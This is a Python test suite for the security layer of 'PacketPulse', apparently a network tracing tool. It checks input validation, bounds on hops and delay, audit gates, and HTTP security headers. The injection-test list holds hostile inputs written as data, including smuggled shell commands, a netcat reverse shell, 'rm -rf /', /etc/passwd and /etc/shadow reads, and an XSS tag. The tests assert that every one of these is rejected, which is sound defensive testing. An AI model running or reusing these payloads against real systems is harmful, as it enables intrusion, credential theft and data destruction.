"""Unit and integration tests for PacketPulse security layer, input validation, and boundary enforcement."""

import http.server
import json
import socket
import threading
import unittest
import urllib.parse
import urllib.request
import urllib.error

from packetpulse.security import (
    validate_target,
    validate_hops,
    validate_delay,
    validate_mode,
    SecurityAuditor,
)
from packetpulse.web import PacketPulseHTTPHandler, ThreadedHTTPServer


class TestSecurityValidation(unittest.TestCase):
    """Test input sanitization and command injection defense."""

    def test_valid_targets(self):
        valid = [
            "google.com",
            "cloudflare.com",
            "8.8.8.8",
            "1.1.1.1",
            "2606:4700:4700::1111",
            "sub.domain.example.co.uk",
            "localhost",
        ]
        for t in valid:
            self.assertEqual(validate_target(t), t)

    def test_command_injection_rejected(self):
        injections = [
            "google.com; cat /etc/passwd",
            "1.1.1.1 && whoami",
            "8.8.8.8 | id",
            "`rm -rf /`",
            "$(uname -a)",
            "google.com\nmalicious",
            "../../etc/shadow",
            "<script>alert(1)</script>",
            "127.0.0.1; nc -e /bin/sh 10.0.0.1 4444",
            "foo$bar",
            "test>out.txt",
        ]
        for bad in injections:
            with self.assertRaises(ValueError, msg=f"Payload was not blocked: {bad}"):
                validate_target(bad)

    def test_empty_and_oversized_targets(self):
        with self.assertRaises(ValueError):
            validate_target("")
        with self.assertRaises(ValueError):
            validate_target("   ")
        with self.assertRaises(ValueError):
            validate_target("a" * 254 + ".com")

    def test_hop_boundaries(self):
        self.assertEqual(validate_hops(999999), 64)
        self.assertEqual(validate_hops(-5), 1)
        self.assertEqual(validate_hops(0), 1)
        self.assertEqual(validate_hops(25), 25)
        self.assertEqual(validate_hops("invalid", default=20), 20)

    def test_delay_boundaries(self):
        self.assertEqual(validate_delay(50.0), 2.0)
        self.assertEqual(validate_delay(-1.0), 0.0)
        self.assertEqual(validate_delay(0.08), 0.08)
        self.assertEqual(validate_delay("invalid", default=0.05), 0.05)

    def test_mode_validation(self):
        self.assertEqual(validate_mode("simulated"), "simulated")
        self.assertEqual(validate_mode("raw"), "raw")
        self.assertEqual(validate_mode("system"), "system")
        self.assertEqual(validate_mode("auto"), "auto")
        self.assertEqual(validate_mode("malicious_mode", default="simulated"), "simulated")


class TestSecurityAuditor(unittest.TestCase):
    """Test the automated SecurityAuditor engine."""

    def setUp(self):
        self.auditor = SecurityAuditor(verbose=False)

    def test_raw_socket_boundary(self):
        res = self.auditor.audit_raw_socket_boundary()
        self.assertTrue(res["passed"])

    def test_command_injection_audit(self):
        res = self.auditor.audit_command_injection_vectors()
        self.assertTrue(res["passed"])
        self.assertEqual(res["blocked_payloads"], res["tested_payloads"])

    def test_resource_dos_boundaries(self):
        res = self.auditor.audit_resource_dos_boundaries()
        self.assertTrue(res["passed"])

    def test_sast_codebase(self):
        res = self.auditor.audit_sast_codebase()
        self.assertTrue(res["passed"], f"SAST issues detected: {res.get('issues')}")

    def test_frontend_xss_protection(self):
        res = self.auditor.audit_frontend_xss_protection()
        self.assertTrue(res["passed"])

    def test_run_all_audit_gates(self):
        results = self.auditor.run_all()
        self.assertEqual(len(results), 5)
        self.assertTrue(all(r["passed"] for r in results))


class TestWebSecurityHeaders(unittest.TestCase):
    """Test HTTP security headers and injection protection on REST endpoints."""

    @classmethod
    def setUpClass(cls):
        cls.server = ThreadedHTTPServer(("127.0.0.1", 0), PacketPulseHTTPHandler)
        cls.port = cls.server.server_address[1]
        cls.thread = threading.Thread(target=cls.server.serve_forever, daemon=True)
        cls.thread.start()

    @classmethod
    def tearDownClass(cls):
        cls.server.shutdown()
        cls.server.server_close()

    def test_security_headers_present(self):
        url = f"http://127.0.0.1:{self.port}/api/status"
        req = urllib.request.Request(url)
        with urllib.request.urlopen(req) as resp:
            self.assertEqual(resp.headers.get("X-Content-Type-Options"), "nosniff")
            self.assertEqual(resp.headers.get("X-Frame-Options"), "SAMEORIGIN")
            self.assertEqual(resp.headers.get("Referrer-Policy"), "strict-origin-when-cross-origin")
            self.assertIn("default-src 'self'", resp.headers.get("Content-Security-Policy", ""))

    def test_injection_rejected_by_api(self):
        malicious_target = urllib.parse.quote("google.com; cat /etc/passwd")
        url = f"http://127.0.0.1:{self.port}/api/trace?target={malicious_target}"
        try:
            urllib.request.urlopen(url)
            self.fail("Expected HTTP 400 Bad Request for injection attempt")
        except urllib.error.HTTPError as e:
            self.assertEqual(e.code, 400)
            body = json.loads(e.read().decode("utf-8"))
            self.assertIn("error", body)


if __name__ == "__main__":
    unittest.main()
